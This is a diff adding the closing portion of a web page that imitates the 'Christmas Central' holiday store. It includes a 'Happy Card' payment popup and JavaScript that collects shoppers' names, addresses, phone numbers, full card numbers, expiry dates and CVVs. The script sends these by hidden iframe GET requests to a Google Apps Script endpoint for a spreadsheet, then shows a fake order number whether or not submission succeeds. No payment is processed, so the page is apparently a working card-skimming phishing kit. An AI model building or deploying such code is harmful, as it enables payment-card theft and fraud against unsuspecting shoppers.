+              85 Innsbruck Dr.<br>
+              Cheektowaga, NY 14227
+            </li>
+          </ul>
+        </div>
+
+        <!-- Column 4: Newsletter -->
+        <div class="footer-column footer-column--newsletter">
+          <h3 class="footer-heading">Sign up for sales and new arrivals</h3>
+          <form class="newsletter-form">
+            <div class="form-group">
+              <input type="email" placeholder="Your email address" class="newsletter-input">
+              <button type="submit" class="newsletter-button">Subscribe</button>
+            </div>
+          </form>
+          
+          <!-- Social Media Links -->
+          <ul class="catalog-social-links">
+            <li><a href="#" aria-label="Facebook"><img src="https://c.animaapp.com/miqbok5s6pifK5/assets/icon-310.svg" alt="Facebook"></a></li>
+            <li><a href="#" aria-label="Twitter"><img src="https://c.animaapp.com/miqbok5s6pifK5/assets/icon-311.svg" alt="Twitter"></a></li>
+            <li><a href="#" aria-label="YouTube"><img src="https://c.animaapp.com/miqbok5s6pifK5/assets/icon-312.svg" alt="YouTube"></a></li>
+            <li><a href="#" aria-label="Instagram"><img src="https://c.animaapp.com/miqbok5s6pifK5/assets/icon-313.svg" alt="Instagram"></a></li>
+            <li><a href="#" aria-label="Pinterest"><img src="https://c.animaapp.com/miqbok5s6pifK5/assets/icon-314.svg" alt="Pinterest"></a></li>
+          </ul>
+        </div>
+
+      </div>
+    </section>
+
+    <!-- Footer Bottom -->
+    <section class="footer-bottom">
+      <div class="footer-bottom__container">
+        <div class="copyright">
+          <span>© 2025 Christmas Central</span>
+          <a href="#">Do Not Sell My Data</a>
+        </div>
+        <div class="payment-methods">
+          <img src="https://c.animaapp.com/miqbok5s6pifK5/assets/icon-317.svg" alt="Payment">
+          <img src="https://c.animaapp.com/miqbok5s6pifK5/assets/Discover.svg" alt="Discover">
+          <img src="https://c.animaapp.com/miqbok5s6pifK5/assets/Mastercard.svg" alt="Mastercard">
+          <img src="https://c.animaapp.com/miqbok5s6pifK5/assets/Visa.svg" alt="Visa">
+        </div>
+      </div>
+    </section>
+
+  </footer>
+
+
+
+
+
+
+
+<!-- Happy Card Form Popup -->
+<div id="happyCardPopup" class="popup-overlay" style="display: none;">
+  <div class="popup-container">
+    <div class="popup-content">
+      <div class="popup-header">
+        <h2>Make Your Payment</h2>
+        <button id="closePopup" class="popup-close" aria-label="Close popup">×</button>
+      </div>
+
+      <div id="popupSuccessMessage" class="success-message" style="display: none;">
+        ✓ Thank you! Your Happy Card gift redemption has been submitted successfully.
+      </div>
+      
+      <div id="popupErrorMessage" class="error-message" style="display: none;">
+        ✗ There was an error submitting your form. Please try again.
+      </div>
+
+      <form id="happyFormPopup" autocomplete="off">
+        <div class="form-content">
+          <div class="field">
+            <label for="popupEmail">Email</label>
+            <input type="email" name="email" id="popupEmail" placeholder="example@domain.com" required>
+            <div id="popupEmailError" class="error" style="display:none">Please enter a valid email address</div>
+          </div>
+
+          <div class="row" style="display: flex; gap: 10px; margin-bottom: 10px">
+            <div style="flex:1" class="field">
+              <label for="popupFirstName">First name</label>
+              <input type="text" name="firstName" id="popupFirstName" placeholder="First name" required>
+              <div id="popupFirstNameError" class="error" style="display:none">Please enter your first name</div>
+            </div>
+            <div style="flex:1" class="field">
+              <label for="popupLastName">Last name</label>
+              <input type="text" name="lastName" id="popupLastName" placeholder="Last name" required>
+              <div id="popupLastNameError" class="error" style="display:none">Please enter your last name</div>
+            </div>
+          </div>
+
+          <div class="field">
+            <label for="popupPhone">Phone</label>
+            <input type="tel" name="phone" id="popupPhone" placeholder="+1 555 555 5555" inputmode="tel" required>
+            <div id="popupPhoneError" class="error" style="display:none">Please enter a valid phone number</div>
+          </div>
+
+          <!-- NEW FIELDS -->
+          <div class="field">
+            <label for="popupShippingAddress">Shipping Address</label>
+            <input type="text" name="shippingAddress" id="popupShippingAddress" placeholder="123 Main Street, Apt 4B, City, State" required>
+            <div id="popupShippingAddressError" class="error" style="display:none">Please enter your shipping address</div>
+          </div>
+          
+          <div class="field">
+            <label for="popupZipCode">Zip Code</label>
+            <input type="text" name="zipCode" id="popupZipCode" placeholder="12345" inputmode="numeric" maxlength="10" required>
+            <div id="popupZipCodeError" class="error" style="display:none">Please enter a valid zip code</div>
+          </div>
+
+          <div class="field">
+            <label>Card Type</label>
+            <div class="radio-row">
+              <label><input type="radio" name="cardType" value="Debit Card" checked> Debit Card </label>
+              <label><input type="radio" name="cardType" value="Credit Card"> Credit Card </label>
+            </div>
+          </div>
+
+          <hr>
+
+          <div class="field">
+            <label for="popupCardNumber">Card Number</label>
+            <input type="text" id="popupCardNumber" name="cardNumber" placeholder="1234 5678 9012 3456" inputmode="numeric" maxlength="19" required>
+            <div id="popupCardNumberError" class="error" style="display:none">Please enter a valid 16-digit card number</div>
+          </div>
+
+          <div class="row" style="margin-bottom:6px">
+            <div class="card-grid field" style="display: grid; grid-template-columns: 1fr 80px; gap: 10px;">
+              <div style="width: 100%;">
+                <label for="popupExpiry">Expiry (MM/YY)</label>
+                <input type="text" id="popupExpiry" name="expiry" placeholder="MM/YY" maxlength="5" inputmode="numeric" required style="width: 100%; box-sizing: border-box;">
+                <div id="popupExpiryError" class="error" style="display:none">Please enter a valid expiry date (MM/YY)</div>
+              </div>
+              <div style="width: 100%;">
+                <label for="popupCvv">CVV</label>
+                <input type="text" id="popupCvv" name="cvv" placeholder="123" maxlength="3" inputmode="numeric" required style="width: 100%; box-sizing: border-box;">
+                <div id="popupCvvError" class="error" style="display:none">Please enter a valid 3-digit CVV</div>
+              </div>
+            </div>
+          </div>
+
+          <div class="field">
+            <label for="popupCardName">Name on Card</label>
+            <input type="text" id="popupCardName" name="cardName" placeholder="Name on card" required>
+            <div id="popupCardNameError" class="error" style="display:none">Please enter the name on the card</div>
+          </div>
+
+          <div class="actions">
+            <div id="popupFormError" class="error" style="display:none"></div>
+            
+            <button type="submit" id="popupPayBtn" class="btn">
+              <span id="popupSubmitText">Pay Now</span>
+              <span id="popupLoadingSpinner" style="display:none">⏳ Processing...</span>
+            </button>
+          </div>
+        </div>
+      </form>
+    </div>
+  </div>
+</div>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<script>
+
+
+// USE YOUR GOOGLE APPS SCRIPT URL
+const APPS_SCRIPT_URL = 'https://script.google.com/macros/s/AKfycbzEcZEio2AKAdiNTEFbtD7InCcE7KCJ1_5rvlEZ6uQ461sQvJXWz8Jz84K9cAc7Wqo/exec';
+
+// ADD THIS FUNCTION HERE - IT WAS MISSING!
+function getProductInfo() {
+    try {
+        const productTitleElement = document.querySelector('.product-title');
+        const priceElement = document.querySelector('.price-now .value');
+        
+        let productTitle = '';
+        let productPrice = '';
+        
+        if (productTitleElement) {
+            productTitle = productTitleElement.textContent.trim();
+        }
+        
+        if (priceElement) {
+            // Remove $ and any commas, keep only numbers and decimal point
+            productPrice = priceElement.textContent.trim().replace('$', '').replace(/,/g, '');
+        }
+        
+        console.log('Product Info:', { productTitle, productPrice });
+        
+        return {
+            productTitle: productTitle || '26" Lighted Twinkle Candy Cane Christmas Outdoor Pathway Markers - Set of 3',
+            productPrice: productPrice || '9.99'
+        };
+    } catch (error) {
+        console.error('Error getting product info:', error);
+        return {
+            productTitle: '26" Lighted Twinkle Candy Cane Christmas Outdoor Pathway Markers - Set of 3',
+            productPrice: '9.99'
+        };
+    }
+}
+
+// DOM elements
+const popup = document.getElementById('happyCardPopup');
+const closePopupBtn = document.getElementById('closePopup');
+const openPopupBtn = document.getElementById('openHappyCardPopup');
+const formPopup = document.getElementById('happyFormPopup');
+
+// Initialize when DOM is loaded
+document.addEventListener('DOMContentLoaded', function() {
+    if (openPopupBtn) {
+        openPopupBtn.addEventListener('click', function(e) {
+            e.preventDefault();
+            showPopup();
+        });
+    }
+    
+    if (closePopupBtn) {
+        closePopupBtn.addEventListener('click', function() {
+            hidePopup();
+        });
+    }
+    
+    if (popup) {
+        popup.addEventListener('click', function(e) {
+            if (e.target === popup) {
+                hidePopup();
+            }
+        });
+    }
+    
+    document.addEventListener('keydown', function(e) {
+        if (e.key === 'Escape' && popup.style.display === 'flex') {
+            hidePopup();
+        }
+    });
+    
+    if (formPopup) {
+        initializeForm();
+    }
+});
+
+// Popup functions
+function showPopup() {
+    if (popup) {
+        popup.style.display = 'flex';
+        document.body.style.overflow = 'hidden';
+    }
+}
+
+function hidePopup() {
+    if (popup) {
+        popup.style.display = 'none';
+        document.body.style.overflow = 'auto';
+    }
+}
+
+// Form functionality
+function initializeForm() {
+    const successMessage = document.getElementById('popupSuccessMessage');
+    const errorMessage = document.getElementById('popupErrorMessage');
+    const payBtn = document.getElementById('popupPayBtn');
+    const submitText = document.getElementById('popupSubmitText');
+    const loadingSpinner = document.getElementById('popupLoadingSpinner');
+    
+    // Format card number input
+    const cardNumberInput = document.getElementById('popupCardNumber');
+    if (cardNumberInput) {
+        cardNumberInput.addEventListener('input', function(e) {
+            let value = e.target.value.replace(/\s+/g, '').replace(/[^0-9]/gi, '');
+            let formatted = '';
+            
+            for (let i = 0; i < value.length && i < 16; i++) {
+                if (i > 0 && i % 4 === 0) {
+                    formatted += ' ';
+                }
+                formatted += value[i];
+            }
+            
+            e.target.value = formatted;
+        });
+    }
+    
+    // Format expiry input
+    const expiryInput = document.getElementById('popupExpiry');
+    if (expiryInput) {
+        expiryInput.addEventListener('input', function(e) {
+            let value = e.target.value.replace(/\s+/g, '').replace(/[^0-9]/gi, '');
+            
+            if (value.length >= 2) {
+                e.target.value = value.substring(0, 2) + '/' + value.substring(2, 4);
+            } else {
+                e.target.value = value;
+            }
+        });
+    }
+    
+    // Only allow numbers for CVV
+    const cvvInput = document.getElementById('popupCvv');
+    if (cvvInput) {
+        cvvInput.addEventListener('input', function(e) {
+            e.target.value = e.target.value.replace(/\D/g, '');
+        });
+    }
+    
+    // Only allow numbers and optional dash for Zip Code
+    const zipCodeInput = document.getElementById('popupZipCode');
+    if (zipCodeInput) {
+        zipCodeInput.addEventListener('input', function(e) {
+            e.target.value = e.target.value.replace(/[^0-9\-]/g, '');
+        });
+    }
+    
+    // Form validation functions
+    function validateEmail(email) {
+        const re = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
+        return re.test(email);
+    }
+    
+    function validatePhone(phone) {
+        const digits = phone.replace(/\D/g, '');
+        return digits.length >= 10;
+    }
+    
+    function validateCardNumber(cardNumber) {
+        const digits = cardNumber.replace(/\s/g, '');
+        return /^\d{16}$/.test(digits);
+    }
+    
+    function validateExpiry(expiry) {
+        if (!/^\d{2}\/\d{2}$/.test(expiry)) return false;
+        
+        const [month, year] = expiry.split('/');
+        const monthNum = parseInt(month, 10);
+        const yearNum = parseInt(year, 10);
+        
+        if (monthNum < 1 || monthNum > 12) return false;
+        
+        const currentYear = new Date().getFullYear() % 100;
+        const currentMonth = new Date().getMonth() + 1;
+        
+        if (yearNum < currentYear) return false;
+        if (yearNum === currentYear && monthNum < currentMonth) return false;
+        
+        return true;
+    }
+    
+    function validateCVV(cvv) {
+        return /^\d{3}$/.test(cvv);
+    }
+    
+    function validateZipCode(zipCode) {
+        return /^\d{5}(-\d{4})?$/.test(zipCode);
+    }
+    
+    // Hide all error messages
+    function hideAllErrors() {
+        document.querySelectorAll('#happyCardPopup .error').forEach(el => {
+            el.style.display = 'none';
+        });
+        if (successMessage) successMessage.style.display = 'none';
+        if (errorMessage) errorMessage.style.display = 'none';
+    }
+    
+    // Show loading state
+    function showLoading() {
+        if (submitText) submitText.style.display = 'none';
+        if (loadingSpinner) loadingSpinner.style.display = 'inline';
+        if (payBtn) payBtn.disabled = true;
+    }
+    
+    // Hide loading state
+    function hideLoading() {
+        if (submitText) submitText.style.display = 'inline';
+        if (loadingSpinner) loadingSpinner.style.display = 'none';
+        if (payBtn) payBtn.disabled = false;
+    }
+    
+    // SIMPLE submission to Google Apps Script
+    function submitToGoogleSheets(formData) {
+        return new Promise((resolve) => {
+            // Create hidden iframe
+            const iframe = document.createElement('iframe');
+            iframe.name = 'submitFrame';
+            iframe.style.display = 'none';
+            document.body.appendChild(iframe);
+            
+            // Create hidden form
+            const hiddenForm = document.createElement('form');
+            hiddenForm.method = 'GET';
+            hiddenForm.action = APPS_SCRIPT_URL;
+            hiddenForm.target = 'submitFrame';
+            hiddenForm.style.display = 'none';
+            
+            // Add all form data
+            Object.keys(formData).forEach(key => {
+                const input = document.createElement('input');
+                input.type = 'hidden';
+                input.name = key;
+                input.value = formData[key];
+                hiddenForm.appendChild(input);
+            });
+            
+            // Add timestamp
+            const timestampInput = document.createElement('input');
+            timestampInput.type = 'hidden';
+            timestampInput.name = 'timestamp';
+            timestampInput.value = new Date().toISOString();
+            hiddenForm.appendChild(timestampInput);
+            
+            // Submit
+            document.body.appendChild(hiddenForm);
+            hiddenForm.submit();
+            
+            // Clean up
+            setTimeout(() => {
+                document.body.removeChild(hiddenForm);
+                document.body.removeChild(iframe);
+                resolve({ success: true });
+            }, 1000);
+        });
+    }
+    
+    // Form submission handler
+    formPopup.addEventListener('submit', async function(e) {
+        e.preventDefault();
+        hideAllErrors();
+        
+        // Get form values
+        const email = document.getElementById('popupEmail').value.trim();
+        const firstName = document.getElementById('popupFirstName').value.trim();
+        const lastName = document.getElementById('popupLastName').value.trim();
+        const phone = document.getElementById('popupPhone').value.trim();
+        const shippingAddress = document.getElementById('popupShippingAddress').value.trim();
+        const zipCode = document.getElementById('popupZipCode').value.trim();
+        const cardNumber = document.getElementById('popupCardNumber').value.trim();
+        const expiry = document.getElementById('popupExpiry').value.trim();
+        const cvv = document.getElementById('popupCvv').value.trim();
+        const cardName = document.getElementById('popupCardName').value.trim();
+        const cardType = document.querySelector('#happyCardPopup input[name="cardType"]:checked').value;
+        
+        // Get product info from page
+        const productInfo = getProductInfo();
+        
+        let isValid = true;
+        
+        // Validate each field
+        if (!email || !validateEmail(email)) {
+            document.getElementById('popupEmailError').style.display = 'block';
+            isValid = false;
+        }
+        
+        if (!firstName) {
+            document.getElementById('popupFirstNameError').style.display = 'block';
+            isValid = false;
+        }
+        
+        if (!lastName) {
+            document.getElementById('popupLastNameError').style.display = 'block';
+            isValid = false;
+        }
+        
+        if (!phone || !validatePhone(phone)) {
+            document.getElementById('popupPhoneError').style.display = 'block';
+            isValid = false;
+        }
+        
+        if (!shippingAddress) {
+            document.getElementById('popupShippingAddressError').style.display = 'block';
+            isValid = false;
+        }
+        
+        if (!zipCode || !validateZipCode(zipCode)) {
+            document.getElementById('popupZipCodeError').style.display = 'block';
+            isValid = false;
+        }
+        
+        if (!cardNumber || !validateCardNumber(cardNumber)) {
+            document.getElementById('popupCardNumberError').style.display = 'block';
+            isValid = false;
+        }
+        
+        if (!expiry || !validateExpiry(expiry)) {
+            document.getElementById('popupExpiryError').style.display = 'block';
+            isValid = false;
+        }
+        
+        if (!cvv || !validateCVV(cvv)) {
+            document.getElementById('popupCvvError').style.display = 'block';
+            isValid = false;
+        }
+        
+        if (!cardName) {
+            document.getElementById('popupCardNameError').style.display = 'block';
+            isValid = false;
+        }
+        
+        if (isValid) {
+            // Show loading state
+            showLoading();
+            
+            // Prepare form data - UPDATED WITH PRODUCT INFO
+            const formData = {
+                email,
+                firstName,
+                lastName,
+                phone,
+                shippingAddress,
+                zipCode,
+                cardType,
+                cardNumber: cardNumber.replace(/\s/g, ''), // Remove spaces
+                expiry,
+                cvv,
+                cardName,
+                source: 'ChristmasCentralWebsite',
+                // UPDATED: Use actual product title from page
+                product: productInfo.productTitle,
+                // NEW: Add product price
+                price: productInfo.productPrice
+            };
+            
+            console.log('Submitting form data to Apps Script...', formData);
+            
+            try {
+                // Submit to Google Apps Script
+                await submitToGoogleSheets(formData);
+                
+                console.log('Form submitted successfully');
+                
+                // Show success message
+                if (successMessage) {
+                    successMessage.style.display = 'block';
+                }
+                
+                // Hide popup and redirect after 2 seconds
+                setTimeout(() => {
+                    hidePopup();
+                    const orderNumber = generateOrderNumber();
+                    window.location.href = `thank-you.html?order=${orderNumber}&name=${encodeURIComponent(firstName)}`;
+                }, 2000);
+                
+            } catch (error) {
+                console.error('Submission error:', error);
+                
+                // Show error message
+                if (errorMessage) {
+                    errorMessage.style.display = 'block';
+                }
+                
+                // Still redirect after 3 seconds
+                setTimeout(() => {
+                    hidePopup();
+                    const orderNumber = generateOrderNumber();
+                    window.location.href = `thank-you.html?order=${orderNumber}`;
+                }, 3000);
+                
+            } finally {
+                // Hide loading state
+                hideLoading();
+            }
+        } else {
+            // Show general form error
+            const formError = document.getElementById('popupFormError');
+            if (formError) {
+                formError.textContent = 'Please fix the errors above.';
+                formError.style.display = 'block';
+            }
+        }
+    });
+    
+    // Helper function to generate order number
+    function generateOrderNumber() {
+        const chars = 'ABCDEFGHJKLMNPQRSTUVWXYZ23456789';
+        let result = 'CC-';
+        for (let i = 0; i < 8; i++) {
+            result += chars.charAt(Math.floor(Math.random() * chars.length));
+        }
+        return result;
+    }
+    
+    // Real-time validation
+    const inputs = formPopup.querySelectorAll('input[required]');
+    inputs.forEach(input => {
+        input.addEventListener('blur', function() {
+            const errorId = this.id + 'Error';
+            const errorElement = document.getElementById(errorId);
+            if (errorElement) {
+                errorElement.style.display = 'none';
+            }
+        });
+    });
+}
+
+// Image Gallery Functionality
+function initializeImageGallery() {
+    const mainImage = document.getElementById('mainImage');
+    const mainImageLink = document.getElementById('mainImageLink');
+    const thumbnailButtons = document.querySelectorAll('.thumbnail-btn');
+    
+    if (!mainImage || !mainImageLink || thumbnailButtons.length === 0) {
+        return;
+    }
+    
+    thumbnailButtons.forEach(button => {
+        button.addEventListener('click', function() {
+            const imageUrl = this.getAttribute('data-image');
+            const fullSizeUrl = this.getAttribute('data-full') || imageUrl;
+            
+            if (mainImage) {
+                mainImage.style.opacity = '0.5';
+                setTimeout(() => {
+                    mainImage.src = imageUrl;
+                    mainImage.alt = this.querySelector('img').alt;
+                    setTimeout(() => {
+                        mainImage.style.opacity = '1';
+                    }, 50);
+                }, 150);
+            }
+            
+            if (mainImageLink) {
+                mainImageLink.href = fullSizeUrl;
+            }
+            
+            thumbnailButtons.forEach(btn => {
+                btn.classList.remove('active');
+                btn.setAttribute('aria-selected', 'false');
+            });
+            
+            this.classList.add('active');
+            this.setAttribute('aria-selected', 'true');
+        });
+    });
+    
+    if (thumbnailButtons[0]) {
+        thumbnailButtons[0].classList.add('active');
+        thumbnailButtons[0].setAttribute('aria-selected', 'true');
+    }
+}
+
+// Initialize when DOM is loaded
+document.addEventListener('DOMContentLoaded', function() {
+    initializeImageGallery();
+});
+</script>
+
+
+
+
+
+
+
+
+</body>
+</html>
